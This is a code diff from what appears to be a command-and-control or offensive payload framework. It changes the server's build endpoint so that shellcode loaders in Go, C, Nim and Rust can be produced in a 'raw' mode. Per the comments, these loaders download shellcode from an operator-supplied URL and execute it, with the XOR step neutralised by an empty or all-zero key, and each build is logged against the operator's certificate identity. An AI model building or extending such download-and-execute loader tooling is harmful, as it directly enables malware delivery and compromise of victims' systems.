@@ -1284,8 +1284,10 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 		result["html"] = htmlPath
 
-	case cfg.Format == "loader" && cfg.RawPayload:
-		// Raw mode: build shellcode (.bin) without encryption, bake user-supplied URL
+	case cfg.RawPayload && (cfg.Format == "loader" || cfg.Format == "loader-c" || cfg.Format == "loader-nim" || cfg.Format == "loader-rust"):
+		// Raw mode: build shellcode (.bin) without staging/encryption; loader fetches
+		// directly from user-supplied URL. Go loader skips XOR when key=""; C/Nim/Rust
+		// use "00000000" (4 zero bytes) so XOR is a no-op on the raw shellcode.
 		if cfg.PayloadURL == "" {
 			jsonErr(w, "payload_url required for raw_payload=true", http.StatusBadRequest)
 			return
@@ -1311,14 +1313,23 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, "build shellcode: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
-		// Raw loader: XORKey="" → loader downloads and executes without decryption
-		loaderPath, err := BuildLoader(cfg, cfg.PayloadURL, "", deliveryDir)
+		var loaderPath string
+		switch cfg.Format {
+		case "loader-c":
+			loaderPath, err = BuildCLoader(cfg, cfg.PayloadURL, "00000000", deliveryDir)
+		case "loader-nim":
+			loaderPath, err = BuildNimLoader(cfg, cfg.PayloadURL, "00000000", deliveryDir)
+		case "loader-rust":
+			loaderPath, err = BuildRustLoader(cfg, cfg.PayloadURL, "00000000", deliveryDir)
+		default: // "loader" (Go) — empty key skips XOR; zlib fallback returns raw bytes
+			loaderPath, err = BuildLoader(cfg, cfg.PayloadURL, "", deliveryDir)
+		}
 		if err != nil {
 			jsonErr(w, "build loader: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
 		op := operatorFromCert(r)
-		s.printf("[%s] build raw loader: url=%s\n", op, cfg.PayloadURL)
+		s.printf("[%s] build raw loader (%s): url=%s\n", op, cfg.Format, cfg.PayloadURL)
 		result["loader"] = loaderPath
 		result["bin"] = binPath
 		jsonOK(w, result)
